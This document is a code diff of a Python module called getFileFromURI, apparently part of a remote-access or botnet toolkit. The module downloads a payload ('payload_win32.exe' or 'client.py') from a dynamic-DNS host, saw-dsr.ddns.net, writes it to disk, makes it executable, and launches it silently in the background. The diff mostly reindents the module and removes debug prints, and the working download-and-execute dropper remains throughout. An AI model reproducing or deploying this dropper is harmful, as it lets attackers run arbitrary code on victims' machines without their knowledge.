@@ -23,72 +23,59 @@ except:
 #"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
 #TODO: use free FTP server
 bin = False
-ScriptExec = "python3.5 "
+ScriptExec = "python3.5" # "./"  #cmd= "./{}".format(OsTargetpath)
 url = "http://127.0.0.1:8000/TCP_client.py"
 OsTargetpath = ".payload_posix"
 shellcode = ""
 start = True #To decide entweder an oder aus die Zugriff
 
 def run(**args):
-  #os.system("echo '[*] In getFileFromURI module.'>> .Tlog.log") #Todelete
-  print('[*] In getFileFromURI module.')
-  global bin, url, ScriptExec, OsTargetpath, shellcode
-  if os.name == 'nt':
+    #os.system("echo '[*] In getFileFromURI module.'>> .Tlog.log") #Todelete
+    print('[*] In getFileFromURI module.')
+    global bin, url, ScriptExec, OsTargetpath, shellcode
+    if os.name == 'nt':
       bin = True
       url = "http://saw-dsr.ddns.net:8000/test"
       OsTargetpath = "payload_win32.exe"
-  elif os.name == 'posix':
+    elif os.name == 'posix':
       bin = False
       ScriptExec = "python3.5 "
       #url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
       OsTargetpath = "client.py"
-  else:
+    else:
       return "[ERROR] getFileFromURI: Not recognised OS!"
 
-  try:
-    http = urllib3.PoolManager()
-    #The HTTPResponse object provides status, data, and header attributes:
-    r = http.request('GET', url)
-    shellcode = r.data
-  except urllib3.exceptions.MaxRetryError:
-  	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
-  	return "getFileFromURI: HTTP Error 404: File not found"
-  except urllib3.exceptions.URLError:
-  	#os.system("echo '<urlopen error [Errno 111] Connection refused>' >> .Tlog.log")
-  	return "getFileFromURI: Connection refused"
-
-  #The data attribute of the response is always set to a byte string representing the response content
-  cmd = ""
-  if bin:
-    mon_fichier = open(OsTargetpath, "wb")
-    mon_fichier.write(shellcode)
-    mon_fichier.close()
-    cmd= "./{}".format(OsTargetpath)
-  else:
     try:
-        print("*********** Before Writing in %s *********"%OsTargetpath)
+        http = urllib3.PoolManager()
+        #The HTTPResponse object provides status, data, and header attributes:
+        r = http.request('GET', url)
+        #The data attribute of the response is always set to a byte string representing the response content
+        shellcode = r.data
+    except urllib3.exceptions.MaxRetryError:
+    	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
+    	return "getFileFromURI: HTTP Error 404: File not found"
+    except urllib3.exceptions.URLError:
+    	#os.system("echo '<urlopen error [Errno 111] Connection refused>' >> .Tlog.log")
+    	return "getFileFromURI: Connection refused"
+
+    try:
         mon_fichier = open(OsTargetpath, "wb")
         mon_fichier.write(shellcode)
-        print("*********** After Writing *********")
-        time.sleep(1)
         mon_fichier.close()
     except:
         print("[Error] getFileFromURI: could not create Targetscript")
         return " modules/_bootlocale not found!!"
     cmd= ScriptExec+" "+OsTargetpath
-
-  print(cmd)
-  print(shellcode)
-  if start and os.name == 'nt': #TODO: check how to start python script
+    if start and os.name == 'nt': #TODO: check how to start python script
           os.system("start {}".format(cmd)) #os.system("start {}".format(OsTargetpath))
-  elif start and os.name == 'posix':
+    elif start and os.name == 'posix':
           os.system("chmod 755 {}".format(OsTargetpath))
           os.system(cmd +">/dev/null &")
-  else:
+    else:
           return ("Script is Stored under {} but never started".format(OsTargetpath))
 
-  time.sleep(5)
-  return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
+    time.sleep(5)
+    return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
 
 
 #run()
